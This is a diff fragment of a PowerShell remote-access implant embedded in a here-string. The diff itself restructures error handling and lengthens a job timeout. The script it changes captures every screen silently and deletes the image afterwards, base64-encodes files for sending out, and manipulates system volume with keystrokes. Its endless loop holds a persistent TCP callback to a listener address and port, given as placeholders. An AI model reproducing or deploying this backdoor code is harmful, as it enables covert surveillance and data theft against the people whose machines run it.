@@ -4,8 +4,8 @@ function transfer($p){$a=[System.Convert]::ToBase64String([io.file]::ReadAllByte
 function screenshot(){Add-Type -AssemblyName System.Windows.Forms,System.Drawing;$s=[Windows.Forms.Screen]::AllScreens;$b=[Drawing.Rectangle]::FromLTRB(($s.Bounds.Left|Measure-Object -Minimum).Minimum,($s.Bounds.Top|Measure-Object -Minimum).Minimum,($s.Bounds.Right|Measure-Object -Maximum).Maximum,($s.Bounds.Bottom|Measure-Object -Maximum).Maximum);$i=New-Object System.Drawing.Bitmap([int]$b.width),([int]$b.height);$g=[Drawing.Graphics]::FromImage($i);$g.CopyFromScreen($b.Location,[Drawing.Point]::Empty,$b.size);$i.Save("$env:USERPROFILE\q.png");$g.Dispose();$i.Dispose();transfer("$env:USERPROFILE\q.png");rm -Force "$env:USERPROFILE\q.png"}
 Function volume($v){$sh = new-object -com wscript.shell;1..50|%{$sh.SendKeys([char]174)};1..$v|%{$sh.SendKeys([char]175)}}
 while($true){
-	try{
-		$job=start-job -scriptblock {
+	$job=start-job -scriptblock {
+		try{
 			$socket = new-object System.Net.Sockets.TcpClient("[LISTENER_ADDRESS]", [LISTENER_PORT]);
 			if($socket -eq $null){throw}
 			$stream = $socket.GetStream();
@@ -39,12 +39,12 @@ while($true){
 			$writer.close()
 			$socket.close()
 			throw
+		}catch {
+			sleep -Seconds 10
 		}
-		$job | wait-job -timeout 240
-		$job | stop-job
-	}catch {
-		sleep -Seconds 10
 	}
+	$job | wait-job -timeout 300
+	$job | stop-job
 }
 '@
 
